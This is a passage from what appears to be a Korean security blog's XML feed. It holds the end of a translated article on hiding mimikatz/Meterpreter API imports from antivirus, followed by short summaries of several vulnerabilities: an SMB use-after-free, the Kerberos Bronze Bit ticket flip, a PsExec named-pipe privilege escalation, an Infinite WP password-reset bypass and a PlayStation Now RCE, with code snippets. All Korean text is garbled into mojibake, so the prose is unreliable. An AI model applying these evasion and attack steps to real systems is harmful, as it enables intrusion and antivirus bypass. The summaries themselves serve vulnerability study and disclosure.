í˜¸ì¶œì€ ì™„ë²½í•˜ê²Œ ìˆ˜ì •ë˜ì—ˆë‹¤.</p><p><img src="/2020/12/13/idioth/av_evasion_part2/6.png"></p><p><code>samlib.dll</code>ì—ì„œ ê°€ì ¸ì˜¨ í•¨ìˆ˜ í˜¸ì¶œë“¤ì€ ì™„ë²½í•˜ê²Œ ìˆ˜ì •ë˜ì—ˆë‹¤.</p><p><code>PRINT_ERROR</code> ë§¤í¬ë¡œ ë‚´ë¶€ì˜ ë¬¸ìì—´ì€ <code>do&#123;&#125;while(0)</code>ì„ í†µí•´ ë§¤í¬ë¡œë¥¼ ì‚¬ìš©í•˜ì—¬ ë‚œë…í™” ë˜ì§€ ì•Šì•˜ë‹¤. obfuscatorì˜ ë²„ê·¸ë¥¼ ì°¾ëŠ”ë° <code>mimikatz</code>ë³´ë‹¤ ì¢‹ì€ í”„ë¡œì íŠ¸ë¥¼ ì°¾ê¸° ëª»í–ˆë‹¤.</p><h2 id="ê°œì„ ì‚¬í•­"><a href="#ê°œì„ ì‚¬í•­" class="headerlink" title="ê°œì„ ì‚¬í•­"></a>ê°œì„ ì‚¬í•­</h2><p>ì´ ë¶€ë¶„ì€ ì—¬ëŸ¬ë¶„ì„ ìœ„í•´ ë‚¨ê²¨ì§„ ì‘ì—…ë“¤ì´ë‹¤ ğŸ™‚</p><h3 id="More-stealth"><a href="#More-stealth" class="headerlink" title="More stealth"></a>More stealth</h3><p>run-time dynamic linkingì„ ìˆ˜í–‰í•˜ê¸° ìœ„í•´ ì‹¤ì œë¡œ API <code>LoadLibrary/GetProcAddress</code>ê°€ í•„ìš”í•˜ì§€ ì•Šë‹¤.</p><p>í›„í‚¹ì„ í”¼í•˜ê¸° ìœ„í•´ ì´ í•¨ìˆ˜ë“¤ì€ ì¬êµ¬í˜„í•˜ëŠ” ê²ƒì´ ì¢‹ê³  ì´ë¯¸ ê·¸ê²ƒì„ í•  ìˆ˜ ìˆëŠ” ì˜¤í”ˆì†ŒìŠ¤ í”„ë¡œì íŠ¸ê°€ ìˆë‹¤.(<a href="https://github.com/rapid7/ReflectiveDLLInjection/">ReflectiveDllInjection</a>)</p><p>ì—¬ê¸°ê¹Œì§€ ì½ì—ˆë‹¤ë©´, translation unitì˜ ìƒë‹¨ì— ì´ëŸ¬í•œ í•¨ìˆ˜ë“¤ì„ ìœ„í•œ êµ¬í˜„ì„ ì¶”ê°€í•˜ê³ (<code>findInjectionSpot</code> ì‚¬ìš©) WinAPI ëŒ€ì‹ ì— êµ¬í˜„ì„ ì‚¬ìš©í•˜ê¸° ìœ„í•´ ë©”ì†Œë“œ <code>addGetProcAddress</code>ë¥¼ ì—…ë°ì´íŠ¸í•˜ë©´ ëœë‹¤ëŠ” ê²ƒì„ ì•Œ ê²ƒì´ë‹¤.</p><h3 id="Error-handling"><a href="#Error-handling" class="headerlink" title="Error handling"></a>Error handling</h3><ul><li><code>LoadLibrary</code>ëŠ” ì„±ê³µì ìœ¼ë¡œ ìˆ˜í–‰ë˜ì§€ ì•Šì„ ê²½ìš° <code>NULL</code>ì„ ë°˜í™˜í•˜ë¯€ë¡œ ì´ì— ëŒ€í•œ ê²€ì‚¬ë¥¼ ì¶”ê°€í•˜ì—¬ ì˜¤ë¥˜ë¥¼ ì •ìƒì ìœ¼ë¡œ ë³µêµ¬í•  ìˆ˜ ìˆë‹¤. í˜„ì¬ ìƒí™©ì—ì„œ í¬ë˜ì‹œê°€ ë§¤ìš° ì˜ ë‚  ìˆ˜ë„ ìˆë‹¤.</li><li><code>GetProcAddress</code>ë„ ì˜¤ë¥˜ê°€ ë°œìƒí•˜ë©´ <code>NULL</code>ì„ ë°˜í™˜í•˜ë¯€ë¡œ ì´ê²ƒë„ í™•ì¸í•˜ëŠ” ê²ƒì´ ì¤‘ìš”í•˜ë‹¤.</li></ul><h2 id="ê²°ë¡ "><a href="#ê²°ë¡ " class="headerlink" title="ê²°ë¡ "></a>ê²°ë¡ </h2><p>ì´ ê¸€ì—ì„œ ìš°ë¦¬ëŠ” ì •ê·œì‹ì„ ì‚¬ìš©í•˜ì§€ ì•Šê³  C/C++ ì½”ë“œ ë² ì´ìŠ¤ì—ì„œ í•¨ìˆ˜ í˜¸ì¶œì„ ì •í™•í•˜ê²Œ êµì²´í•  ìˆ˜ ìˆëŠ” ë°©ë²•ì„ ë³´ì—¬ì¤¬ë‹¤. ëª¨ë“  ê²ƒì€ ì•ˆí‹°ë°”ì´ëŸ¬ìŠ¤ ì†Œí”„íŠ¸ì›¨ì–´ê°€ ìš°ë¦¬ê°€ pentestë¥¼ í•˜ëŠ” ë™ì•ˆ ì‚¬ìš©í•˜ëŠ” Meterpreterë‚˜ ë‹¤ë¥¸ ì†Œí”„íŠ¸ì›¨ì–´ì— ê´€í•´ í–‰ë™ ì •ë³´ë¥¼ ì •ì ìœ¼ë¡œ ìˆ˜ì§‘í•˜ëŠ” ê²ƒì„ ë§‰ê¸° ìœ„í•´ ì§„í–‰ë˜ì—ˆë‹¤.</p><p>ESET Nod32ì— ì ìš©ëœ ì´ ì‘ì—…ì€ ëª¨ë“  Meterpreter ëª¨ë“ˆì´ íƒì§€ë˜ì§€ ì•Šë„ë¡ í•˜ëŠ” ì£¼ìš” ë‹¨ê³„ì˜€ê³  ë” ë°œì „ëœ ì œí’ˆì— ë„ì›€ì´ ë˜ì—ˆë‹¤.</p><p>API importsë¥¼ ìˆ¨ê¸°ëŠ” ê²ƒë„ í•˜ë‚˜ì§€ë§Œ ì•…ì„±ì½”ë“œê°€ ì‹¤í–‰ë˜ë©´ ë³´ì•ˆ ì†Œí”„íŠ¸ì›¨ì–´ê°€ API í˜¸ì¶œ ëª¨ë‹ˆí„°ë§ì— ì˜í•´ í–‰ë™ ì •ë³´ë¥¼ ìˆ˜ì§‘í•˜ëŠ” ë°©ë²•ë„ ìˆë‹¤.</p><p>ê·¸ëŸ° ê´€ì ì—ì„œ ë‹¤ìŒ ê¸€ì€ ì˜ì‹¬ìŠ¤ëŸ¬ìš´ Win32 APIê°€ ì§ì ‘ì ì¸ syscallsì„ í•˜ë„ë¡ ìë™ì ìœ¼ë¡œ refactoring í•˜ëŠ” ê²ƒì´ë‹¤. ì´ê²ƒì€ Cylance, Trapsê³¼ Kaspersky ê°™ì€ AVì˜ userland hookì„ í†µí•œ ëŸ°íƒ€ì„ íƒì§€ ìš°íšŒì˜ í•µì‹¬ ë‹¨ê³„ì´ë‹¤.</p><h2 id="ì¶œì²˜"><a href="#ì¶œì²˜" class="headerlink" title="ì¶œì²˜"></a>ì¶œì²˜</h2><p>[1] The Rootkit Arsenal, Chapter 11, p.480.</p><p>[2]<a href="https://devblogs.microsoft.com/cppblog/exploring-clang-tooling-part-2-examining-the-clang-ast-with-clang-query/">https://devblogs.microsoft.com/cppblog/exploring-clang-tooling-part-2-examining-the-clang-ast-with-clang-query/</a></p>]]></content>
    
    
    <categories>
      
      <category>Translation</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>bypass</tag>
      
      <tag>evasion</tag>
      
      <tag>meterpreter</tag>
      
      <tag>obfuscation</tag>
      
      <tag>iat</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-17140 : SMB uaf to info disclosure</title>
    <link href="/2020/12/12/fabu1ous/2020-12-12/"/>
    <url>/2020/12/12/fabu1ous/2020-12-12/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blogs.360.cn/post/CVE-2020-17140-Analysis.html">Windows SMB Information Disclousure Analysis</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows 7 ~ Windows 10</p><p>svr2.sys ë“œë¼ì´ë²„</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>patch Tuesday(2020.12.08)ì—ì„œ CVE-2020-17140ê°€ íŒ¨ì¹˜ë˜ì–´ Write-upì´ ê³µê°œë˜ì—ˆìŠµë‹ˆë‹¤. CVE-2020-17140ì€ <code>SMB2_SET_INFO</code> íŒ¨í‚·ì˜ ì²˜ë¦¬ ë¡œì§ì—ì„œ ë°œìƒí•˜ëŠ” use after freeë¡œ ì»¤ë„ ë©”ëª¨ë¦¬ë¥¼ ë…¸ì¶œì‹œí‚¤ëŠ” ì·¨ì•½ì ì…ë‹ˆë‹¤.</p><p>SMBv2 ì´í›„ë¶€í„° LEASEë¼ëŠ” ìƒˆë¡œìš´ caching mechanismì´ ë„ì…ë˜ì—ˆê³  í´ë¼ì´ì–¸íŠ¸ëŠ” <code>SMB2_CREATE_REQEUST_LEASE_V2</code> íŒ¨í‚·ì„ ë³´ë‚´ ê³µìœ  íŒŒì¼ì— leaseë¥¼ ìƒì„±í•˜ê³ , <code>SMB2_SET_INFO</code> íŒ¨í‚·ì„ ë³´ë‚´ ê³µìœ  íŒŒì¼ì˜ leaseë¥¼ ìˆ˜ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>srv2.sys ë“œë¼ì´ë²„ëŠ” SMB2_SET_INFO íŒ¨í‚·ì„ ë°›ìœ¼ë©´ <code>srv2!Smb2UpdateLeaseFileName</code>ë¥¼ í˜¸ì¶œí•´ì„œ lease ì´ë¦„ì„ ìˆ˜ì •í•˜ëŠ”ë°, new lease nameì´ ê¸°ì¡´ì˜ old lease nameë³´ë‹¤ ê¸¸ ê²½ìš° ìƒˆë¡œìš´ ë©”ëª¨ë¦¬(newFileBuf)ë¥¼ í• ë‹¹í•´ old lease nameì„ ë°±ì—…í•©ë‹ˆë‹¤.</p><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( *(_BYTE *)(v6 + <span class="hljs-number">114</span>) )ExFreePoolWithTag(oldFileBuf, <span class="hljs-number">0</span>);<span class="hljs-keyword">if</span> ( v11 )memmove(newFileBuf, oldFileBuf, <span class="hljs-number">2</span>i64 * v11);</code></pre><p>old lease nameì„ ë‹´ê³  ìˆë˜ oldFileBufë¥¼ í• ë‹¹ í•´ì œí•œ í›„ì— newFileBufì— ë³µì‚¬í•˜ê¸° ë•Œë¬¸ì— use after freeê°€ ë°œìƒí•©ë‹ˆë‹¤. oldFileBufë¥¼ í•´ì œí•œ í›„ ëŒ•ê¸€ë§ í¬ì¸í„°ì˜ ìƒíƒœì— ë”°ë¼ kernel info leak ë˜ëŠ” BSoDë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>kernel</tag>
      
      <tag>use after free</tag>
      
      <tag>smb</tag>
      
      <tag>info leak</tag>
      
      <tag>bsod</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-17049: Kerberos Bronze Bit Attack</title>
    <link href="/2020/12/11/l0ch/2020-12-11/"/>
    <url>/2020/12/11/l0ch/2020-12-11/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-attack/">CVE-2020-17049: Kerberos Bronze Bit Attack â€“ Practical Exploitation</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>standard Windows versions since 2000</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>KerberosëŠ” Windows Active Directory ë„ë©”ì¸ ë‚´ì—ì„œ ì‚¬ìš©ì, ì„œë²„ ë° ê¸°íƒ€ ë¦¬ì†ŒìŠ¤ë¥¼ ì„œë¡œ ì¸ì¦í•˜ëŠ” ë° ì‚¬ìš©ë˜ëŠ” í”„ë¡œí† ì½œì…ë‹ˆë‹¤.<br>Kerberosì˜ ê¸°ì¡´ ê³µê²© ë°©ë²•ì¸ Golden Ticket ë° Silver Ticket ê³µê²©ì˜ ë³€í˜•ì¸ Bronze Bit ê³µê²©ì´ ê³µê°œë˜ì—ˆìŠµë‹ˆë‹¤.</p><blockquote><p>Golden/Silver Ticket ê³µê²©<br>ë‚´ë¶€ ë„¤íŠ¸ì›Œí¬ì— ì¹¨ì…í•œ ì´í›„ ë™ì¼í•œ ë„¤íŠ¸ì›Œí¬ì˜ Kerberos ì¸ì¦ì‹œìŠ¤í…œì„ ì‚¬ìš©í•˜ëŠ” ë‹¤ë¥¸ ì‹œìŠ¤í…œì˜ ìê²© ì¦ëª…ì„ ìœ„ì¡°í•˜ëŠ” ê³µê²©ê¸°ë²•</p></blockquote><br><p>Bronze BitëŠ” Microsoftê°€ Kerberos í”„ë¡œí† ì½œì— ì¶”ê°€ í•œ <code>S4U2self</code> ë° <code>S4U2proxy</code> í”„ë¡œí† ì½œì„ ì•…ìš©í•˜ë©° Kerberos í”„ë¡œì„¸ìŠ¤ê°€ ë³€ì¡°ëœ ì„œë¹„ìŠ¤ í‹°ì¼“ì„ ê°ì§€í•  ìˆ˜ ì—†ì–´ ë°œìƒí•©ë‹ˆë‹¤. ê³µê²©ì„ ìœ„í•´ì„œëŠ” ë‹¤ìŒ ì¡°ê±´ì´ ë§Œì¡±ë˜ì–´ì•¼ í•©ë‹ˆë‹¤.</p><ol><li>í•´ì»¤ëŠ” ë‚´ë¶€ ë„¤íŠ¸ì›Œí¬ì˜ ì‹œìŠ¤í…œ í•˜ë‚˜(Service1)ë¥¼ ì¥ì•…í•´ Active Directory ë‚´ì— ì ‘ê·¼ ê¶Œí•œì´ ìˆì–´ì•¼ í•©ë‹ˆë‹¤.</li><li>ì¹¨ì…í•œ ì‹œìŠ¤í…œì¸ Service1ì— ëŒ€í•œ ì•”í˜¸ í•´ì‹œê°€ í•„ìš”í•©ë‹ˆë‹¤.</li><li>Service1ì—ëŠ” ë‹¤ë¥¸ ì‹œìŠ¤í…œ(Service2)ì— ëŒ€í•œ ì œí•œëœ ì‹ ë¢° ê´€ê³„ê°€ ìˆìŠµë‹ˆë‹¤.</li></ol><p>ìœ„ ì¡°ê±´ì´ ë§Œì¡±ë˜ë©´ í•´ì»¤ëŠ” ë‹¤ìŒê³¼ ê°™ì€ ê³µê²©ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><ol><li>ì‚¬ìš©ìë¥¼ ì‹ë³„í•˜ê³  í‹°ì¼“ì„ ë°˜í™˜í•˜ëŠ” <code>S4U2self</code> ì—ì„œ User2ì˜ Service1 ì„œë¹„ìŠ¤ í‹°ì¼“ì„ ê°€ì ¸ì˜µë‹ˆë‹¤. ì´ë•Œ <code>force-forwardable</code> ì˜µì…˜ì„ ì‚¬ìš©í•˜ë©´ ë°˜í™˜í•˜ëŠ” ì„œë¹„ìŠ¤ í‹°ì¼“ì´ ì „ë‹¬ ê°€ëŠ¥í•œ í‹°ì¼“ìœ¼ë¡œ ë³€í™˜ë©ë‹ˆë‹¤.</li><li>Service1ì˜ í•´ì‹œë¡œ í‹°ì¼“ì„ ë³µí˜¸í™”í•˜ê³  í”Œë˜ê·¸ ê°’ì˜ ë‘ ë²ˆì§¸ ë¹„íŠ¸ë¥¼ 0â†’1 ë¡œ ë³€ê²½í•œ ë’¤ ë‹¤ì‹œ ì•”í˜¸í™”í•©ë‹ˆë‹¤. </li><li>ì¡°ì‘ëœ í‹°ì¼“ì€ <code>S4U2proxy</code> ì—ì„œ ì „ì†¡ë˜ê³  Service2ì— ëŒ€í•œ ì„œë¹„ìŠ¤ í‹°ì¼“ì´ User2ë¡œ ë°˜í™˜ë˜ì–´ <code>User2.ccache</code>ì˜ ë””ìŠ¤í¬ì— ê¸°ë¡ë©ë‹ˆë‹¤.</li><li>í•´ì»¤ëŠ” Service1 ìœ ì €(User1) ê¶Œí•œìœ¼ë¡œ Service2 ìœ ì €(User2)ì˜ Kerberos ì„œë¹„ìŠ¤ í‹°ì¼“ì„ ì–»ì„ ìˆ˜ ìˆì–´ User2 ê¶Œí•œìœ¼ë¡œ Service2ì— ì•¡ì„¸ìŠ¤ê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤.</li></ol><p>ì´ëŠ” Golden/Silver Ticketê³¼ ìœ ì‚¬í•œ ê³µê²© ë°©ë²•ì´ì§€ë§Œ ë‹¨ì¼ ë¹„íŠ¸ í”Œë¦½ì„ ì´ìš©í–ˆê¸° ë•Œë¬¸ì— Bronze Bitë¡œ ëª…ëª…ë˜ì—ˆìŠµë‹ˆë‹¤.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-theory/">https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-theory/</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>L0ch</tag>
      
      <tag>kerberos</tag>
      
      <tag>bronze bit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] PsExec Local Privilege Escalation</title>
    <link href="/2020/12/10/idioth/2020-12-10/"/>
    <url>/2020/12/10/idioth/2020-12-10/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://medium.com/tenable-techblog/psexec-local-privilege-escalation-2e8069adc9c8">PsExec Local Privilege Escalation</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>PsExec v2.2 all the way back to v1.72 (2006)</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><blockquote><p>ì•„ì§ íŒ¨ì¹˜ë˜ì§€ ì•Šì€ ì·¨ì•½ì ì…ë‹ˆë‹¤.</p></blockquote><p>SysInternals Suiteì—ì„œ ì›ê²©ìœ¼ë¡œ ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” PsExecì—ì„œ Local Privilege Escalation ì·¨ì•½ì ì´ ë°œê²¬ëìŠµë‹ˆë‹¤. í•´ë‹¹ ì·¨ì•½ì ì€ ê¸€ì„ ì‘ì„±í•œ ì‹œì ì˜ ë²„ì „ì¸ PsExec v2.2ê¹Œì§€ ì˜í–¥ì„ ë¯¸ì¹˜ë©° ì•„ì§ íŒ¨ì¹˜ë˜ì§€ ì•Šì•˜ìŠµë‹ˆë‹¤.</p><p>PsExec í´ë¼ì´ì–¸íŠ¸ì™€ ì›ê²© PSEXESVC ì„œë¹„ìŠ¤ëŠ” named pipeë¥¼ í†µí•´ í†µì‹ í•©ë‹ˆë‹¤. ê·¸ ì¤‘ <code>\\PSEXESVC</code> íŒŒì´í”„ëŠ” ì‹¤í–‰í•  ì‘ìš© í”„ë¡œê·¸ë¨, ëª…ë ¹ì¤„ ë°ì´í„° ë“± PsExec í´ë¼ì´ì–¸íŠ¸ì˜ ëª…ë ¹ì„ ë¶„ì„í•˜ì—¬ ì‹¤í–‰í•˜ëŠ” ì—­í• ì„ í•©ë‹ˆë‹¤. <code>\\PSEXESVC</code> íŒŒì´í”„ëŠ” Administratorë§Œ read/write ê¶Œí•œì„ ê°€ì ¸ ê¶Œí•œì´ ë‚®ì€ ì‚¬ìš©ìê°€ íŒŒì´í”„ì— read\write í•˜ëŠ” ê²ƒì„ ë§‰ìŠµë‹ˆë‹¤.</p><p>í•˜ì§€ë§Œ PSEXESVCê°€ <code>\\PSEXESVC</code> íŒŒì´í”„ë¥¼ ìƒì„±í•  ë•Œ íŒŒì´í”„ê°€ ì´ë¯¸ ì¡´ì¬í•  ê²½ìš° í•´ë‹¹ <code>\\PSEXESVC</code> íŒŒì´í”„ì˜ handleì„ ê°€ì ¸ì˜µë‹ˆë‹¤. ë”°ë¼ì„œ ë‚®ì€ ê¶Œí•œì˜ ì• í”Œë¦¬ì¼€ì´ì…˜ì´ PSEXESVCê°€ ì‹¤í–‰ë˜ê¸° ì „ì— <code>\\PSEXESVC</code> íŒŒì´í”„ë¥¼ ìƒì„±í•˜ë©´ PSEXESVCëŠ” ìì‹ ì´ ìƒì„±í•œ íŒŒì´í”„ê°€ ì•„ë‹Œ ì´ë¯¸ ì¡´ì¬í•˜ëŠ” íŒŒì´í”„ì˜ handleì„ ê°€ì ¸ì˜µë‹ˆë‹¤. PSEXESVCê°€ ë‚®ì€ ê¶Œí•œìœ¼ë¡œ ìƒì„±ëœ <code>\\PSEXESVC</code> íŒŒì´í”„ì˜ handleì„ ê°€ì ¸ì˜¤ë©´ PSEXESVCì„ í†µí•´ SYSTEM ê¶Œí•œìœ¼ë¡œ ëª…ë ¹, ì‘ìš© í”„ë¡œê·¸ë¨ ì‹¤í–‰ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>lpe</tag>
      
      <tag>named pipe</tag>
      
      <tag>idioth</tag>
      
      <tag>psexec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-28642: Auth bypass via password reset mechanism</title>
    <link href="/2020/12/09/fabu1ous/2020-12-09/"/>
    <url>/2020/12/09/fabu1ous/2020-12-09/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://ssd-disclosure.com/ssd-advisory-auth-bypass-and-rce-in-infinite-wp-admin-panel/">Auth bypass and RCE in Infinite WP admin panel</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Infinite WP &lt;= 2.15.6</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>WordPress ì›¹ì‚¬ì´íŠ¸ì˜ ê´€ë¦¬ ì†”ë£¨ì…˜ Infinite WPì—ì„œ ë¹„ë°€ë²ˆí˜¸ ì¬ì„¤ì • ë°©ì‹ì˜ ê²°í•¨ì„ ì´ìš©í•´ admin panelì— ì ‘ê·¼í•  ìˆ˜ ìˆëŠ” ì¸ì¦ ìš°íšŒ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs php">$hashValue = serialize(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;hashCode&#x27;</span> =&gt; <span class="hljs-string">&#x27;resetPassword&#x27;</span>, <span class="hljs-string">&#x27;uniqueTime&#x27;</span> =&gt; microtime(<span class="hljs-literal">true</span>), <span class="hljs-string">&#x27;userPin&#x27;</span> =&gt; $userDets[<span class="hljs-string">&#x27;userID&#x27;</span>]));$resetHash = sha1($hashValue);[...]$verificationURL = APP_URL.<span class="hljs-string">&quot;login.php?view=resetPasswordChange&amp;resetHash=&quot;</span>.$resetHash.<span class="hljs-string">&quot;&amp;transID=&quot;</span>.sha1($params[<span class="hljs-string">&quot;email&quot;</span>]);</code></pre><p>ë¹„ë°€ë²ˆí˜¸ ì¬ì„¤ì • ë§í¬ë¥¼ ìƒì„±í•˜ëŠ” phpì½”ë“œì…ë‹ˆë‹¤.  í”¼í•´ìì˜ <code>email</code>ì„ ì‚¬ì „ì— ì…ìˆ˜í•˜ê³  <code>userID</code>,  <code>microtime(true)</code> ê°’ì„ ìœ ì¶”í•  ìˆ˜ ìˆë‹¤ë©´ ëˆ„êµ¬ë‚˜ ìœ íš¨í•œ ë§í¬ë¥¼ íƒ€ê³  ì›í•˜ëŠ” ìœ ì €ì˜ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì¬ì„¤ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><ul><li>userID<ul><li>auto-increment integerì…ë‹ˆë‹¤. manage-userë¼ëŠ” ìœ ë£Œ addonì„ êµ¬ë§¤í•˜ì§€ ì•Šì•˜ë‹¤ë©´ ê¸°ë³¸ê°’ì´ 1ì…ë‹ˆë‹¤.</li></ul></li><li>email<ul><li>ê°€ì…ë˜ì§€ ì•Šì€ email ì£¼ì†Œë¼ë©´ <code>login.php?view=resetPassword&amp;errorMsg=resetPasswordEmailNotFound</code>ë¡œ redirect ë©ë‹ˆë‹¤. ì´ë¥¼ ì´ìš©í•´ Infinite WPì— ê°€ì…ëœ emailì¸ì§€ íŒë³„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</li></ul></li><li>microtime(true)<ul><li>microtime(true)ì˜ ê°’ì€ ë¹„ë°€ë²ˆí˜¸ ì¬ì„¤ì • ë§í¬ê°€ ë§Œë“¤ì–´ì§ˆ ë•Œì˜ Unix timestampì…ë‹ˆë‹¤. Http date í•´ë” ê°’ì„ ì´ìš©í•´ ìœ ì¶”ê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤.</li></ul></li></ul><p>ìƒì„±ëœ ë§í¬ëŠ” 24ì‹œê°„ ë™ì•ˆ ìœ íš¨í•©ë‹ˆë‹¤. ê³µê°œëœ POCëŠ” ìœ„ì—ì„œ ì„¤ëª…í•œ ì„¸ ê°’ì„ ì´ìš©í•´ ë¸Œë£¨íŠ¸í¬ì‹± ê³µê²©ì„ ì‹œë„í•˜ë©° í‰ê·  1ì‹œê°„ ë‚´ì™¸ë¡œ ìœ íš¨í•œ ë§í¬ë¥¼ ì°¾ì•„ëƒ…ë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>authentication bypass</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Remote Code Execution in PlayStation Now</title>
    <link href="/2020/12/08/l0ch/2020-12-08/"/>
    <url>/2020/12/08/l0ch/2020-12-08/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://hackerone.com/reports/873614">RCE in PlayStation Now</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>PlayStation Now â‰¤ 11.0.2</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ê²Œì„ ìŠ¤íŠ¸ë¦¬ë° ì„œë¹„ìŠ¤ PlayStation Nowì—ì„œ ì›ê²© ì½”ë“œ ì‹¤í–‰ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.<br><br><br>PS Nowì˜ ì£¼ìš” êµ¬ì„±ìš”ì†Œë¡œëŠ” QASì™€ AGLì´ ìˆìŠµë‹ˆë‹¤. QASëŠ” Qt5 í”„ë ˆì„ì›Œí¬ë¡œ ê°œë°œëœ  <code>psnowlauncher.exe</code> ì‹¤í–‰íŒŒì¼ì´ë©° PS Nowì˜ ë©”ì¸ ì• í”Œë¦¬ì¼€ì´ì…˜ì…ë‹ˆë‹¤.  AGLì€ Electron ì‘ìš© í”„ë¡œê·¸ë¨ì´ë©° QASì— ì˜í•´ ì‹¤í–‰ë©ë‹ˆë‹¤. ì²˜ìŒ ë¡œë“œí•  í˜ì´ì§€ì˜ URLì„ ë§¤ê°œë³€ìˆ˜ë¡œ ë°›ì•„ ì‹¤í–‰ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.<br><br><br><code>nodeIntegration</code>ì€ <code>Electron BrowserWindows</code>ì—ì„œ ì‹¤í–‰ë˜ëŠ” ê¸°ëŠ¥ìœ¼ë¡œ javascriptì—ì„œ Windows í”„ë¡œì„¸ìŠ¤ë¥¼ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê¸°ë³¸ê°’ì€ falseì§€ë§Œ AGLì—ì„œëŠ” trueë¡œ ì„¤ì •ë˜ì–´ ìˆìœ¼ë©°, AGLì€ ë¡œë“œí•˜ëŠ” URL ê²€ì¦ì„ í•˜ì§€ ì•Šì•„ í•´ì»¤ì˜ í˜ì´ë¡œë“œê°€ ë‹´ê¸´ URLì„ í†µí•´ javascriptì—ì„œ ì„ì˜ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.<br><br><br>ì´ ì„ì˜ ì½”ë“œ ì‹¤í–‰ ì·¨ì•½ì ì€ QASì—ì„œ ì‹¤í–‰ë˜ëŠ” ë¡œì»¬ ì›¹ ì†Œì¼“ ì„œë²„ë¥¼ í†µí•´ ì›ê²©ìœ¼ë¡œ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì›¹ì‚¬ì´íŠ¸ê°€ ë‹¤ìŒ requestë¥¼ ë¡œì»¬ ì›¹ ì†Œì¼“ ì„œë²„ì— ë³´ë‚´ë©´ AGLì— ë¡œë“œëœ URLì„ QASì—ì„œ ì‹¤í–‰í•©ë‹ˆë‹¤.  </p><pre><code class="hljs json">&#123;  <span class="hljs-attr">&quot;command&quot;</span>: <span class="hljs-string">&quot;setUrl&quot;</span>,  <span class="hljs-attr">&quot;params&quot;</span>: &#123;    <span class="hljs-attr">&quot;url&quot;</span>: <span class="hljs-string">&quot;https://normal_url.com&quot;</span>  &#125;,  <span class="hljs-attr">&quot;source&quot;</span>: <span class="hljs-string">&quot;AGL&quot;</span>,  <span class="hljs-attr">&quot;target&quot;</span>: <span class="hljs-string">&quot;QAS&quot;</span>&#125;</code></pre><p>ê·¸ëŸ¬ë‚˜ sourceì™€ targetì„ ë°”ê¿” URLì„ AGLì—ì„œ ë¡œë“œí•  ìˆ˜ ìˆë„ë¡ êµ¬ì„±í•˜ë©´ ì›ê²©ì—ì„œ AGLì´ ë¡œë“œí•  URLì„ ì¡°ì‘í•  ìˆ˜ 